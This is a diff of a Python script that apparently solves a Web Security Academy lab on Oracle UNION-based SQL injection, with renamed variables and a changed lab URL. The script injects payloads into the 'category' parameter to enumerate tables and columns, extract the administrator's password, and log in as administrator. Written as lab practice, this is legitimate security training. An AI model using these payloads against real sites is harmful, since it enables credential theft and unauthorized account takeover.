@@ -1,6 +1,6 @@
 #########################################################################################
 #
-# Author: Ahmed Elqalawii
+# Author: Ahmed Elqalawy (@elqal3awii)
 #
 # Date: 16/9/2023
 #
@@ -28,44 +28,44 @@ import re
 # Main
 #########
 # change this url to your lab
-url = "https://0a71005804e1fb8f829b1b2e00fd0089.web-security-academy.net"
+url = "https://0ad1004d03a4757c87eae8ac003400d0.web-security-academy.net"
 print(Fore.BLUE + "[#] Injection parameter: " + Fore.YELLOW + "category")
 try:
     # payload to retreive the name of users table
-    users_table_payload = "' union SELECT table_name, null from all_tables-- -"
+    payload = "' union SELECT table_name, null from all_tables-- -"
     # fetch the page with the injected payload
-    users_table_injection = requests.get(
-        f"{url}/filter?category={users_table_payload}")
+    injection = requests.get(
+        f"{url}/filter?category={payload}")
     # extract the name of users table
     users_table = re.findall("<th>(USERS_.*)</th>",
-                             users_table_injection.text)[0]
+                             injection.text)[0]
     print(Fore.WHITE + "1. Injecting a payload to retrieve the name of users table.. " +
           Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + users_table)
 
     try:
         # payload to retreive the names of username and password columns
-        username_password_columns_payload = f"' union SELECT column_name, null from all_tab_columns where table_name = '{users_table}'-- -"
+        payload = f"' union SELECT column_name, null from all_tab_columns where table_name = '{users_table}'-- -"
         # fetch the page with the injected payload
-        username_password_columns_injection = requests.get(
-            f"{url}/filter?category={username_password_columns_payload}")
+        injection = requests.get(
+            f"{url}/filter?category={payload}")
         # extract the name of username column
         username_column = re.findall(
-            "<th>(USERNAME_.*)</th>", username_password_columns_injection.text)[0]
+            "<th>(USERNAME_.*)</th>", injection.text)[0]
         # extract the name of password column
         password_column = re.findall(
-            "<th>(PASSWORD_.*)</th>", username_password_columns_injection.text)[0]
+            "<th>(PASSWORD_.*)</th>", injection.text)[0]
         print(Fore.WHITE + "2. Adjusting the payload to retrieve the names of username and password columns.. " +
               Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + username_column + " | " + password_column)
 
         try:
             # payload to retreive the password of the administrator
-            admin_password_payload = f"' union SELECT {username_column}, {password_column} from {users_table} where {username_column} = 'administrator'-- -"
+            payload = f"' union SELECT {username_column}, {password_column} from {users_table} where {username_column} = 'administrator'-- -"
             # fetch the page with the injected payload
-            admin_password_injection = requests.get(
-                f"{url}/filter?category={admin_password_payload}")
+            injection = requests.get(
+                f"{url}/filter?category={payload}")
             # extract the administrator password
             admin_password = re.findall("<td>(.*)</td>",
-                                        admin_password_injection.text)[0]
+                                        injection.text)[0]
             print(Fore.WHITE + "3. Adjusting the payload to retrieve the administrator password.. " +
                   Fore.GREEN + "OK" + Fore.WHITE + " => " + Fore.YELLOW + admin_password)
 
@@ -89,12 +89,12 @@ try:
                     cookies = {
                         "session": session
                     }
-                    login_inject = requests.post(f"{url}/login", data,
+                    login = requests.post(f"{url}/login", data,
                                                  cookies=cookies, allow_redirects=False)
                     print(
                         Fore.WHITE + "6. Logging in as the administrator.. " + Fore.GREEN + "OK")
                     # extract new session
-                    new_session = login_inject.cookies.get("session")
+                    new_session = login.cookies.get("session")
                     cookies = {
                         "session": new_session
                     }
